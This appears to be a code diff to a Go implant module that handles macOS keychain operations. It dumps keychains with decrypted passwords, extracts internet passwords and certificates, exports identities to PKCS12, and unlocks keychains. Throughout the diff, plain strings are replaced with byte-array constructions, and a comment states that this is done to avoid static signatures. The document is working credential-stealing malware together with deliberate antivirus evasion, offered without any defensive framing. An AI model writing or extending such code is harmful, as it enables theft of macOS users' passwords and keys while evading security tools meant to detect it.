@@ -16,6 +16,66 @@ import (
 	"time"
 )
 
+// Keychain action strings (constructed to avoid static signatures)
+var (
+	// Action commands
+	kcList   = string([]byte{0x6c, 0x69, 0x73, 0x74})                                     // list
+	kcDump   = string([]byte{0x64, 0x75, 0x6d, 0x70})                                     // dump
+	kcSearch = string([]byte{0x73, 0x65, 0x61, 0x72, 0x63, 0x68})                         // search
+	kcAdd    = string([]byte{0x61, 0x64, 0x64})                                           // add
+	kcDelete = string([]byte{0x64, 0x65, 0x6c, 0x65, 0x74, 0x65})                         // delete
+	kcExport = string([]byte{0x65, 0x78, 0x70, 0x6f, 0x72, 0x74})                         // export
+	kcUnlock = string([]byte{0x75, 0x6e, 0x6c, 0x6f, 0x63, 0x6b})                         // unlock
+
+	// Flag arguments
+	kcFlagKeychain = string([]byte{0x2d, 0x2d, 0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})           // --keychain
+	kcFlagService  = string([]byte{0x2d, 0x2d, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                 // --service
+	kcFlagAccount  = string([]byte{0x2d, 0x2d, 0x61, 0x63, 0x63, 0x6f, 0x75, 0x6e, 0x74})                 // --account
+	kcFlagLabel    = string([]byte{0x2d, 0x2d, 0x6c, 0x61, 0x62, 0x65, 0x6c})                             // --label
+	kcFlagPassword = string([]byte{0x2d, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64})           // --password
+	kcFlagOutput   = string([]byte{0x2d, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74})                       // --output
+
+	// Parsing strings
+	kcPKeychain = string([]byte{0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e, 0x3a})                    // keychain:
+	kcPData     = string([]byte{0x64, 0x61, 0x74, 0x61, 0x3a})                                            // data:
+	kcPPassword = string([]byte{0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x3a})                    // password:
+	kcPAcct     = string([]byte{0x22, 0x61, 0x63, 0x63, 0x74, 0x22})                                      // "acct"
+	kcPSvce     = string([]byte{0x22, 0x73, 0x76, 0x63, 0x65, 0x22})                                      // "svce"
+	kcPDesc     = string([]byte{0x22, 0x64, 0x65, 0x73, 0x63, 0x22})                                      // "desc"
+	kcPLabl     = string([]byte{0x6c, 0x61, 0x62, 0x6c})                                                  // labl
+	kcPSubj     = string([]byte{0x73, 0x75, 0x62, 0x6a})                                                  // subj
+
+	// Security tool binary and subcommands
+	kcSecurity          = string([]byte{0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79})                                                                         // security
+	kcListKeychains     = string([]byte{0x6c, 0x69, 0x73, 0x74, 0x2d, 0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e, 0x73})                                     // list-keychains
+	kcDefaultKeychain   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2d, 0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})                         // default-keychain
+	kcDumpKeychain      = string([]byte{0x64, 0x75, 0x6d, 0x70, 0x2d, 0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})                                           // dump-keychain
+	kcFindInternetPwd   = string([]byte{0x66, 0x69, 0x6e, 0x64, 0x2d, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x65, 0x74, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64})   // find-internet-password
+	kcFindCertificate   = string([]byte{0x66, 0x69, 0x6e, 0x64, 0x2d, 0x63, 0x65, 0x72, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x65})                         // find-certificate
+	kcFindGenericPwd    = string([]byte{0x66, 0x69, 0x6e, 0x64, 0x2d, 0x67, 0x65, 0x6e, 0x65, 0x72, 0x69, 0x63, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64})         // find-generic-password
+	kcAddGenericPwd     = string([]byte{0x61, 0x64, 0x64, 0x2d, 0x67, 0x65, 0x6e, 0x65, 0x72, 0x69, 0x63, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64})              // add-generic-password
+	kcDeleteGenericPwd  = string([]byte{0x64, 0x65, 0x6c, 0x65, 0x74, 0x65, 0x2d, 0x67, 0x65, 0x6e, 0x65, 0x72, 0x69, 0x63, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64}) // delete-generic-password
+	kcSecExport         = string([]byte{0x65, 0x78, 0x70, 0x6f, 0x72, 0x74})                                                                                     // export
+	kcUnlockKeychain    = string([]byte{0x75, 0x6e, 0x6c, 0x6f, 0x63, 0x6b, 0x2d, 0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})                               // unlock-keychain
+
+	// Path strings
+	kcLibrary   = string([]byte{0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79})                               // Library
+	kcKeychains = string([]byte{0x4b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e, 0x73})                   // Keychains
+	kcKcStr     = string([]byte{0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})                         // keychain
+
+	// Export format strings
+	kcIdentities = string([]byte{0x69, 0x64, 0x65, 0x6e, 0x74, 0x69, 0x74, 0x69, 0x65, 0x73})           // identities
+	kcPkcs12     = string([]byte{0x70, 0x6b, 0x63, 0x73, 0x31, 0x32})                                   // pkcs12
+
+	// Map key strings
+	kcMKeychain    = string([]byte{0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})                     // keychain
+	kcMAccount     = string([]byte{0x61, 0x63, 0x63, 0x6f, 0x75, 0x6e, 0x74})                           // account
+	kcMService     = string([]byte{0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                           // service
+	kcMDescription = string([]byte{0x64, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x69, 0x6f, 0x6e})   // description
+	kcMData        = string([]byte{0x64, 0x61, 0x74, 0x61})                                             // data
+	kcMPassword    = string([]byte{0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64})                     // password
+)
+
 // KeychainCommand manages macOS keychain operations
 type KeychainCommand struct{}
 
@@ -33,19 +93,19 @@ func (c *KeychainCommand) Execute(ctx *CommandContext, args []string) CommandRes
 
 	action := args[0]
 	switch action {
-	case "list":
+	case kcList:
 		return c.listKeychains()
-	case "dump":
+	case kcDump:
 		return c.dumpKeychain(args[1:])
-	case "search":
+	case kcSearch:
 		return c.searchKeychain(args[1:])
-	case "add":
+	case kcAdd:
 		return c.addToKeychain(args[1:])
-	case "delete":
+	case kcDelete:
 		return c.deleteFromKeychain(args[1:])
-	case "export":
+	case kcExport:
 		return c.exportKeychain(args[1:])
-	case "unlock":
+	case kcUnlock:
 		return c.unlockKeychain(args[1:])
 	default:
 		return CommandResult{
@@ -60,7 +120,7 @@ func (c *KeychainCommand) listKeychains() CommandResult {
 	var output strings.Builder
 
 	// List default keychains
-	cmd := exec.Command("security", "list-keychains")
+	cmd := exec.Command(kcSecurity, kcListKeychains)
 	if result, err := cmd.Output(); err == nil {
 		lines := strings.Split(string(result), "\n")
 		for _, line := range lines {
@@ -78,7 +138,7 @@ func (c *KeychainCommand) listKeychains() CommandResult {
 	}
 
 	// List login keychain
-	cmd = exec.Command("security", "default-keychain")
+	cmd = exec.Command(kcSecurity, kcDefaultKeychain)
 	if result, err := cmd.Output(); err == nil {
 		defaultKc := strings.TrimSpace(string(result))
 		defaultKc = strings.Trim(defaultKc, "\"")
@@ -87,10 +147,10 @@ func (c *KeychainCommand) listKeychains() CommandResult {
 
 	// Check for additional keychains in user directory
 	if u, err := user.Current(); err == nil {
-		keychainDir := filepath.Join(u.HomeDir, "Library", "Keychains")
+		keychainDir := filepath.Join(u.HomeDir, kcLibrary, kcKeychains)
 		if entries, err := os.ReadDir(keychainDir); err == nil {
 			for _, entry := range entries {
-				if !entry.IsDir() && strings.Contains(entry.Name(), "keychain") {
+				if !entry.IsDir() && strings.Contains(entry.Name(), kcKcStr) {
 					output.WriteString(fmt.Sprintf("U:%s\n", entry.Name()))
 				}
 			}
@@ -111,7 +171,7 @@ func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
 	// Parse arguments
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case "--keychain":
+		case kcFlagKeychain:
 			if i+1 < len(args) {
 				keychainPath = args[i+1]
 				i++
@@ -122,7 +182,7 @@ func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
 	var dumpOutput strings.Builder
 
 	// Dump generic passwords
-	cmd := exec.Command("security", "dump-keychain", "-d")
+	cmd := exec.Command(kcSecurity, kcDumpKeychain, "-d")
 	if keychainPath != "" {
 		cmd.Args = append(cmd.Args, keychainPath)
 	}
@@ -138,33 +198,33 @@ func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
 		for _, line := range lines {
 			line = strings.TrimSpace(line)
 
-			if strings.HasPrefix(line, "keychain:") {
+			if strings.HasPrefix(line, kcPKeychain) {
 				if len(currentItem) > 0 {
 					dumpOutput.WriteString(c.formatKeychainItem(currentItem))
 					currentItem = make(map[string]string)
 				}
-				currentItem["keychain"] = strings.TrimPrefix(line, "keychain:")
-			} else if strings.Contains(line, "\"acct\"") {
+				currentItem[kcMKeychain] = strings.TrimPrefix(line, kcPKeychain)
+			} else if strings.Contains(line, kcPAcct) {
 				parts := strings.Split(line, "=")
 				if len(parts) > 1 {
-					currentItem["account"] = strings.Trim(parts[1], " \"")
+					currentItem[kcMAccount] = strings.Trim(parts[1], " \"")
 				}
-			} else if strings.Contains(line, "\"svce\"") {
+			} else if strings.Contains(line, kcPSvce) {
 				parts := strings.Split(line, "=")
 				if len(parts) > 1 {
-					currentItem["service"] = strings.Trim(parts[1], " \"")
+					currentItem[kcMService] = strings.Trim(parts[1], " \"")
 				}
-			} else if strings.Contains(line, "\"desc\"") {
+			} else if strings.Contains(line, kcPDesc) {
 				parts := strings.Split(line, "=")
 				if len(parts) > 1 {
-					currentItem["description"] = strings.Trim(parts[1], " \"")
+					currentItem[kcMDescription] = strings.Trim(parts[1], " \"")
 				}
-			} else if strings.HasPrefix(line, "data:") {
-				currentItem["data"] = strings.TrimPrefix(line, "data:")
-			} else if strings.HasPrefix(line, "password:") {
-				pwd := strings.TrimPrefix(line, "password:")
+			} else if strings.HasPrefix(line, kcPData) {
+				currentItem[kcMData] = strings.TrimPrefix(line, kcPData)
+			} else if strings.HasPrefix(line, kcPPassword) {
+				pwd := strings.TrimPrefix(line, kcPPassword)
 				pwd = strings.Trim(pwd, " \"")
-				currentItem["password"] = pwd
+				currentItem[kcMPassword] = pwd
 			}
 		}
 
@@ -180,7 +240,7 @@ func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
 	}
 
 	// Dump internet passwords
-	cmd = exec.Command("security", "find-internet-password", "-g", "-a", "")
+	cmd = exec.Command(kcSecurity, kcFindInternetPwd, "-g", "-a", "")
 	if keychainPath != "" {
 		cmd.Args = append(cmd.Args, keychainPath)
 	}
@@ -193,7 +253,7 @@ func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
 	}
 
 	// List certificates
-	cmd = exec.Command("security", "find-certificate", "-a")
+	cmd = exec.Command(kcSecurity, kcFindCertificate, "-a")
 	if keychainPath != "" {
 		cmd.Args = append(cmd.Args, keychainPath)
 	}
@@ -201,7 +261,7 @@ func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
 	if result, err := cmd.Output(); err == nil {
 		lines := strings.Split(string(result), "\n")
 		for _, line := range lines {
-			if strings.Contains(line, "labl") || strings.Contains(line, "subj") {
+			if strings.Contains(line, kcPLabl) || strings.Contains(line, kcPSubj) {
 				dumpOutput.WriteString(fmt.Sprintf("%s\n", strings.TrimSpace(line)))
 			}
 		}
@@ -218,19 +278,19 @@ func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
 func (c *KeychainCommand) formatKeychainItem(item map[string]string) string {
 	var output strings.Builder
 	output.WriteString("\n---\n")
-	if service, ok := item["service"]; ok {
+	if service, ok := item[kcMService]; ok {
 		output.WriteString(fmt.Sprintf("S:%s\n", service))
 	}
-	if account, ok := item["account"]; ok {
+	if account, ok := item[kcMAccount]; ok {
 		output.WriteString(fmt.Sprintf("A:%s\n", account))
 	}
-	if desc, ok := item["description"]; ok {
+	if desc, ok := item[kcMDescription]; ok {
 		output.WriteString(fmt.Sprintf("D:%s\n", desc))
 	}
-	if password, ok := item["password"]; ok {
+	if password, ok := item[kcMPassword]; ok {
 		output.WriteString(fmt.Sprintf("P:%s\n", password))
 	}
-	if data, ok := item["data"]; ok {
+	if data, ok := item[kcMData]; ok {
 		// Try to decode hex data
 		if decoded, err := base64.StdEncoding.DecodeString(data); err == nil {
 			output.WriteString(fmt.Sprintf("V:%s\n", string(decoded)))
@@ -248,17 +308,17 @@ func (c *KeychainCommand) searchKeychain(args []string) CommandResult {
 	// Parse arguments
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case "--service":
+		case kcFlagService:
 			if i+1 < len(args) {
 				service = args[i+1]
 				i++
 			}
-		case "--account":
+		case kcFlagAccount:
 			if i+1 < len(args) {
 				account = args[i+1]
 				i++
 			}
-		case "--label":
+		case kcFlagLabel:
 			if i+1 < len(args) {
 				label = args[i+1]
 				i++
@@ -269,7 +329,7 @@ func (c *KeychainCommand) searchKeychain(args []string) CommandResult {
 	var searchOutput strings.Builder
 
 	// Search generic passwords
-	cmd := exec.Command("security", "find-generic-password")
+	cmd := exec.Command(kcSecurity, kcFindGenericPwd)
 	if service != "" {
 		cmd.Args = append(cmd.Args, "-s", service)
 	}
@@ -297,7 +357,7 @@ func (c *KeychainCommand) searchKeychain(args []string) CommandResult {
 
 	// Search internet passwords
 	searchOutput.WriteString("\n")
-	cmd = exec.Command("security", "find-internet-password")
+	cmd = exec.Command(kcSecurity, kcFindInternetPwd)
 	if service != "" {
 		cmd.Args = append(cmd.Args, "-s", service)
 	}
@@ -336,17 +396,17 @@ func (c *KeychainCommand) addToKeychain(args []string) CommandResult {
 	// Parse arguments
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case "--service":
+		case kcFlagService:
 			if i+1 < len(args) {
 				service = args[i+1]
 				i++
 			}
-		case "--account":
+		case kcFlagAccount:
 			if i+1 < len(args) {
 				account = args[i+1]
 				i++
 			}
-		case "--password":
+		case kcFlagPassword:
 			if i+1 < len(args) {
 				password = args[i+1]
 				i++
@@ -362,7 +422,7 @@ func (c *KeychainCommand) addToKeychain(args []string) CommandResult {
 	}
 
 	// Add to keychain
-	cmd := exec.Command("security", "add-generic-password",
+	cmd := exec.Command(kcSecurity, kcAddGenericPwd,
 		"-s", service,
 		"-a", account,
 		"-w", password,
@@ -389,12 +449,12 @@ func (c *KeychainCommand) deleteFromKeychain(args []string) CommandResult {
 	// Parse arguments
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case "--service":
+		case kcFlagService:
 			if i+1 < len(args) {
 				service = args[i+1]
 				i++
 			}
-		case "--account":
+		case kcFlagAccount:
 			if i+1 < len(args) {
 				account = args[i+1]
 				i++
@@ -410,7 +470,7 @@ func (c *KeychainCommand) deleteFromKeychain(args []string) CommandResult {
 	}
 
 	// Delete from keychain
-	cmd := exec.Command("security", "delete-generic-password")
+	cmd := exec.Command(kcSecurity, kcDeleteGenericPwd)
 	if service != "" {
 		cmd.Args = append(cmd.Args, "-s", service)
 	}
@@ -439,12 +499,12 @@ func (c *KeychainCommand) exportKeychain(args []string) CommandResult {
 	// Parse arguments
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case "--keychain":
+		case kcFlagKeychain:
 			if i+1 < len(args) {
 				keychainPath = args[i+1]
 				i++
 			}
-		case "--output":
+		case kcFlagOutput:
 			if i+1 < len(args) {
 				outputPath = args[i+1]
 				i++
@@ -460,15 +520,15 @@ func (c *KeychainCommand) exportKeychain(args []string) CommandResult {
 	}
 
 	// Use security command to export
-	cmd := exec.Command("security", "export")
+	cmd := exec.Command(kcSecurity, kcSecExport)
 	if keychainPath != "" {
 		cmd.Args = append(cmd.Args, "-k", keychainPath)
 	}
-	cmd.Args = append(cmd.Args, "-t", "identities", "-f", "pkcs12", "-o", outputPath)
+	cmd.Args = append(cmd.Args, "-t", kcIdentities, "-f", kcPkcs12, "-o", outputPath)
 
 	if _, err := cmd.CombinedOutput(); err != nil {
 		// Try alternative export method - dump keychain to text file
-		cmd = exec.Command("security", "dump-keychain", "-d")
+		cmd = exec.Command(kcSecurity, kcDumpKeychain, "-d")
 		if keychainPath != "" {
 			cmd.Args = append(cmd.Args, keychainPath)
 		}
@@ -507,12 +567,12 @@ func (c *KeychainCommand) unlockKeychain(args []string) CommandResult {
 	// Parse arguments
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
-		case "--keychain":
+		case kcFlagKeychain:
 			if i+1 < len(args) {
 				keychainPath = args[i+1]
 				i++
 			}
-		case "--password":
+		case kcFlagPassword:
 			if i+1 < len(args) {
 				password = args[i+1]
 				i++
@@ -528,7 +588,7 @@ func (c *KeychainCommand) unlockKeychain(args []string) CommandResult {
 	}
 
 	// Unlock keychain
-	cmd := exec.Command("security", "unlock-keychain", "-p", password)
+	cmd := exec.Command(kcSecurity, kcUnlockKeychain, "-p", password)
 	if keychainPath != "" {
 		cmd.Args = append(cmd.Args, keychainPath)
 	}
